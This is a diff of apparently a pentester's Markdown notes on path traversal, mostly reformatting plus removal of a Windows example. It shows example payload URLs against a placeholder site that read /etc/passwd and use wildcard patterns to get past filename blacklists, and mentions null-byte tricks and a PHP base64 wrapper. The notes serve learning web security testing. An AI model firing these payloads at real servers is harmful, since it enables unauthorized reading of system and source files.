@@ -6,11 +6,9 @@ In some cases, an attacker might be able to write to arbitrary files on the serv
 Imagine a shopping application that displays images of items for sale. This might load an image using the following HTML:<br />
 `<img src="/loadImage?filename=218.png">`<br />
 The loadImage **URL takes a filename parameter and returns the contents of the specified file**. The image files are stored on disk in the location `/var/www/images/`. To return an image, the application appends the requested filename to this base directory and uses a filesystem API to read the contents of the file. In other words, the application reads from the following file path:<br />
-`/var/www/images/218.png`<br />
+`/var/www/images/218.png`<br /><br />
 This application implements no defenses against path traversal attacks. As a result, an attacker can request the following URL to retrieve the `/etc/passwd` file from the server's filesystem:<br />
-`https://insecure-website.com/loadImage?filename=../../../etc/passwd`
-On Windows, both ../ and ..\ are valid directory traversal sequences. The following is an example of an equivalent attack against a Windows-based server:
-`https://insecure-website.com/loadImage?filename=..\..\..\windows\win.ini`
+`https://insecure-website.com/loadImage?filename=../../../etc/passwd`<br /><br />
 
 ----------------------------------------------------
 
@@ -28,9 +26,9 @@ In some cases, serialization techniques detect the path `../` and delete it. We 
 
 ## Black list bypass.
 In other cases the server may have a black list that find some maches and invalidate them like `passwd`. We can bypass it using regular expresions `pass*`: <br />
-`https://insecure-website.com/loadImage?filename=....//....//....//....//etc/pass*`<br />
-`https://insecure-website.com/loadImage?filename=../../../../../etc/ho?ts`<br />
-`https://insecure-website.com/loadImage?filename=../../../../../e??/pa????`<br />
+- `https://insecure-website.com/loadImage?filename=....//....//....//....//etc/pass*`<br />
+- `https://insecure-website.com/loadImage?filename=../../../../../etc/ho?ts`<br />
+- `https://insecure-website.com/loadImage?filename=../../../../../e??/pa????`<br />
 
 
 ## Null byte Path Traversal.
@@ -58,7 +56,7 @@ To view PHP files, we can deploy them in base64 using the following wrapper: <br
 
 
 - We use the wrapper (We dont use .php to search for the file because we saw that the web is adding the extension by it self). 
-<img src="https://github.com/alejandro-pentest/Hacking-Web/assets/161533623/c42f2d73-e3f7-4911-bfc8-c1c41b68b14c" width="600">
+<img src="https://github.com/alejandro-pentest/Hacking-Web/assets/161533623/c42f2d73-e3f7-4911-bfc8-c1c41b68b14c" width="700">
 
 
 - The last step is to decode the base64 output. 
